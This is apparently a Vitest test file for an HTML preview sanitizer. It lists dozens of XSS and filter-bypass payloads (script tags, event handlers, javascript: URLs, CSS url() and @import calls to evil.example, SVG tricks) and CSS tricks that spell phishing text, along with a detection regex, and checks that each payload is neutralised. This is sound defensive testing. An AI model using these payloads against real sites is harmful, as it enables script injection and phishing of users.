import { describe, expect, it } from 'vitest';
import { MAX_PREVIEW_CHARS, sanitizePreviewHtml } from './preview-sanitize';

const GOOD =
  '<style>.r{width:100%;height:100%;box-sizing:border-box;background:#fff;padding:9%;display:flex;gap:8%}.b{flex:1;border-radius:6px;background:#1F6F5C}</style>' +
  '<div class="r"><div class="b"></div><svg viewBox="0 0 10 10" width="40%"><circle cx="5" cy="5" r="4" fill="none" stroke="#16140F" stroke-width="2"/></svg></div>';

// output must never contain any of these, whatever the input
const BANNED = /<script|<iframe|<object|<embed|<link|<meta|<base|<form|<img|<video|<audio|<a[\s>]|<use|<image|<foreignobject|<animate|<set[\s>]|\son\w+\s*=|javascript:|url\s*\(|@import|\b(href|src|srcdoc|xlink:href)\s*=|expression\s*\(|&#|\\/i;

const ATTACKS = [
  '<script>alert(1)</script><div></div>',
  '<SCRIPT SRC=//evil.example/x.js></SCRIPT><div></div>',
  '<div><scr<script>ipt>alert(1)</scr</script>ipt></div>',
  '<img src=x onerror=alert(1)><div></div>',
  '<div onclick="alert(1)" onmouseover=alert(1)></div>',
  '<div style="background:url(https://evil.example/t.png)"></div>',
  '<div style="background:u\\72l(https://evil.example)"></div>',
  '<div style="background:u&#114;l(https://evil.example)"></div>',
  '<div style="width:expression(alert(1))"></div>',
  '<style>@import url(https://evil.example/a.css);.a{background:url("//evil.example/b")}</style><div class="a"></div>',
  '<style>@import "https://evil.example/a.css";</style><div></div>',
  '<style>.a{background:ur/**/l(//evil.example)}</style><div class="a"></div>',
  '<style>@font-face{font-family:x;src:url(//evil.example/f.woff)}</style><div></div>',
  '<style></style><script>alert(1)</script><div></div>',
  '<style>.a{}</style ><iframe src="javascript:alert(1)"></iframe><div></div>',
  '<a href="javascript:alert(1)"><div>x</div></a>',
  '<div><a href="https://evil.example">click</a></div>',
  '<svg><a xlink:href="javascript:alert(1)"><rect width="10" height="10"/></a></svg><div></div>',
  '<svg><use href="https://evil.example/s.svg#x"/></svg><div></div>',
  '<svg><image href="https://evil.example/t.png"/></svg><div></div>',
  '<svg onload=alert(1)><rect/></svg>',
  '<svg><animate attributeName="href" to="javascript:alert(1)"/><set attributeName="onmouseover" to="alert(1)"/></svg><div></div>',
  '<svg><foreignObject><iframe src="//evil.example"></iframe></foreignObject></svg><div></div>',
  '<svg><style>.a{background:&#117;rl(//evil.example)}</style><rect class="a"/></svg>',
  '<svg><rect fill="url(https://evil.example/#g)"/></svg>',
  '<link rel="stylesheet" href="https://evil.example/a.css"><div></div>',
  '<meta http-equiv="refresh" content="0;url=https://evil.example"><div></div>',
  '<base href="https://evil.example/"><div></div>',
  '<form action="https://evil.example"><input name="p"></form><div></div>',
  '<object data="https://evil.example/x.swf"></object><embed src="//evil.example"><div></div>',
  '<video src="//evil.example/v.mp4" poster="//evil.example/p.png"></video><audio src="//evil.example/a.mp3"></audio><div></div>',
  '<div style="background-image:image-set(\'//evil.example/a.png\' 1x)"></div>',
  '<!--<script>alert(1)</script>--><div></div>',
  '<![CDATA[<script>alert(1)</script>]]><div></div>',
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript><div></div>',
  '<textarea><script>alert(1)</script></textarea><div></div>',
  '<div title="x" style=\'color:red\' class=a onfocus=alert(1) autofocus tabindex=1></div>',
  '<div style="behavior:url(x.htc);-moz-binding:url(x.xml#a)"></div>',
  '<div>"><script>alert(1)</script></div>',
  '<div style="color:red">javascript:alert(1)</div>',
  '<plaintext><script>alert(1)</script>',
  '```html\n<script>alert(1)</script><div style="background:url(//e)" onerror=x></div>\n```',
  '<div style="background:URL (//evil.example)"></div>',
  '<style>.a{background:url\n(//evil.example)}</style><div></div>',
  '<div style="background:uurl(rl(//evil.example)"></div>',
];

// no words in any form: CSS-generated text, list markers and counters can spell a phishing notice without a text node
const TEXT_ATTACKS = [
  '<style>.r::before{content:"Organizers: your session expired";color:red}.r{width:100%}</style><div class="r"></div>',
  "<style>.r::after{content:'Re-enter your password at evil.example'}</style><div class=\"r\"></div>",
  '<style>.r::before{content:attr(class)}</style><div class="Sign in at evil"></div>',
  '<style>.r{counter-reset:x 1337}.r::before{content:counter(x)}</style><div class="r"></div>',
  '<style>@counter-style p{system:cyclic;symbols:"P" "W" "N";suffix:" "}.r{display:list-item;list-style:p inside}</style><div class="r"></div>',
  '<style>.r{display:list-item;list-style-type:"Password expired"}</style><div class="r"></div>',
  '<style>.r{quotes:"Call 0800" "";}.r::before{content:open-quote}</style><div class="r"></div>',
  '<style>.r{text-overflow:"Sign in now";overflow:hidden}</style><div class="r"></div>',
  '<style>.r[class="x"]{color:red}</style><div class="r"></div>',
  '<ol><li></li><li></li></ol><ul><li></li></ul><div></div>',
  '<div style="content:&quot;x&quot;"></div>',
  '<svg><text x="1" y="9">Sign in</text><br><div></div><rect/></svg>',
];

describe('sanitizePreviewHtml', () => {
  it('keeps a well-behaved fragment as is (modulo self-closing tags)', () => {
    const out = sanitizePreviewHtml(GOOD)!;
    expect(out).toContain('<div class="r">');
    expect(out).toContain('<circle cx="5" cy="5" r="4" fill="none" stroke="#16140F" stroke-width="2"></circle>');
    expect(out).toContain('.b{flex:1;border-radius:6px;background:#1F6F5C}');
    expect(out).toContain('viewBox="0 0 10 10"');
  });

  it('unwraps a Markdown fence and surrounding prose', () => {
    expect(sanitizePreviewHtml(`Here you go:\n\`\`\`html\n${GOOD}\n\`\`\`\nEnjoy!`)).toBe(sanitizePreviewHtml(GOOD));
  });

  it.each(ATTACKS)('neutralises %s', (attack) => {
    const out = sanitizePreviewHtml(attack);

    if (out !== null) {
      expect(out).not.toMatch(BANNED);
      expect(out).not.toMatch(/evil\.example|alert\(/);
    }
  });

  it.each(TEXT_ATTACKS)('lets no CSS or markup spell words: %s', (attack) => {
    // class names are never rendered, so only what remains outside them counts
    const out = sanitizePreviewHtml(attack)?.replace(/ class="[^"]*"/g, '');

    if (out) {
      expect(out).not.toMatch(/content\s*:|attr\s*\(|counter|list-style|list-item|quotes|text-overflow|["'`]\s*[;}]|<(ol|ul|li|text|br)\b|evil|Sign in/i);
    }
  });

  it('keeps svg shapes but drops html strays inside <svg> and svg strays outside it', () => {
    expect(sanitizePreviewHtml('<svg><br><div><rect/></div></svg><rect/><div></div>')).toBe('<svg><rect></rect></svg><div></div>');
  });

  it('keeps align-content and justify-content (only the content property is text)', () => {
    expect(sanitizePreviewHtml('<div style="display:flex;justify-content:center;align-content:end"></div>')).toBe(
      '<div style="display:flex;justify-content:center;align-content:end"></div>',
    );
  });

  it('cleans huge CSS in linear time and refuses CSS over the cap', () => {
    const t = performance.now();
    sanitizePreviewHtml(`<style>${'a'.repeat(7900)}</style><div></div>`);
    sanitizePreviewHtml(`<div style="${'u'.repeat(7000)}"></div>`);
    expect(performance.now() - t).toBeLessThan(200);
    expect(sanitizePreviewHtml(`<style>.a{color:red}${' '.repeat(9000)}</style><div></div>`)).toBe('<style></style><div></div>');
  });

  it('balances unclosed tags and drops stray closers', () => {
    expect(sanitizePreviewHtml('<div class="a"><span></div></p></span>')).toBe('<div class="a"><span></span></div>');
  });

  it('rejects empty, non-string, text-only and oversized input', () => {
    expect(sanitizePreviewHtml('')).toBeNull();
    expect(sanitizePreviewHtml(undefined)).toBeNull();
    expect(sanitizePreviewHtml('just words, no markup')).toBeNull();
    expect(sanitizePreviewHtml(`<div class="${'x'.repeat(MAX_PREVIEW_CHARS)}"></div>`)).toBeNull();
    expect(sanitizePreviewHtml(`<div>${'x'.repeat(30_000)}</div>`)).toBeNull();
  });

  it('drops a whole CSS declaration that tries to fetch, keeping the rest', () => {
    expect(sanitizePreviewHtml('<div style="background:uurl(rl(//x)"></div>')).not.toMatch(/url\s*\(/);
    expect(sanitizePreviewHtml('<style>.a{color:red;background:url(//x);width:1px}</style><div></div>')).toBe('<style>.a{color:red;;width:1px}</style><div></div>');
  });

  it('drops all text, so a hostile thumbnail cannot show a message or a link', () => {
    expect(sanitizePreviewHtml('<div class="a">Send your password to evil.example <b>now</b></div>')).toBe('<div class="a"><b></b></div>');
  });

  it('keeps only the svg namespace for xmlns', () => {
    expect(sanitizePreviewHtml('<svg xmlns="http://www.w3.org/2000/svg"><rect/></svg>')).toContain('xmlns="http://www.w3.org/2000/svg"');
    expect(sanitizePreviewHtml('<svg xmlns="https://evil.example"><rect/></svg>')).toBe('<svg><rect></rect></svg>');
  });
});
